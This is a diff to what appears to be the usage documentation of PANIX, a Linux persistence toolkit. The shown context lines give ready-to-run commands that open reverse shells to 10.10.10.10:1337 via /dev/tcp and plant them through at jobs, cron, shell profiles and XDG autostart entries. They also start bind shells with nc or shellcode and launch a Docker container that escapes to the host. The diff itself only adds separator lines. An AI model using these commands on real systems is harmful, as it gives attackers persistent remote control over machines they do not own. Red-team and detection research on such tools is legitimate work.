@@ -13,7 +13,7 @@ To execute a basic reverse shell:
 ./panix.sh --reverse-shell --ip <ip> --port <port>
 ```
 
-Persistence Techniques
+--- 
 
 ### At Job Persistence
 
@@ -24,6 +24,7 @@ Schedule a one-time command to be executed at a specific time.
 ```sh
 ./panix.sh --at --custom --command "/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'" --time "now + 1 minute"
 ```
+--- 
 
 ### Cron Job Persistence
 
@@ -55,6 +56,8 @@ Adding to the user's crontab:
 sudo ./panix.sh --cron --custom --command "* * * * * /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'" --crontab
 ```
 
+--- 
+
 ### Shell Profile Persistence
 
 Add a command to a shell profile script (e.g., .bashrc, .zshrc) for execution on shell startup.
@@ -71,6 +74,7 @@ Add a command to a shell profile script (e.g., .bashrc, .zshrc) for execution on
 sudo ./panix.sh --shell-profile --custom --command "(nohup bash -i > /dev/tcp/10.10.10.10/1337 0<&1 2>&1 &)" --path "/root/.bash_profile"
 ```
 
+--- 
 
 ### XDG Autostart Persistence
 
@@ -86,6 +90,7 @@ Create a .desktop file in an XDG autostart directory to execute a command on des
 
 sudo ./panix.sh --xdg --custom --command "/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'" --path "/etc/xdg/autostart/evilxdg.desktop"
 
+--- 
 
 ### Bind Shell
 
@@ -103,6 +108,8 @@ sudo ./panix.sh --bind-shell --default --shellcode --architecture x86
 sudo ./panix.sh --bind-shell --default --lolbin --nc --port 1337
 ```
 
+--- 
+
 ### Docker Container with Host Escape
 
 Run a Docker container configured to escape to the host and execute a reverse shell.
@@ -110,6 +117,8 @@ Run a Docker container configured to escape to the host and execute a reverse sh
 ```sh
 sudo ./panix.sh --malicious-container --default --ip 10.10.10.10 --port 1337
 ```
+
+--- 
 
 ## ROOT
 
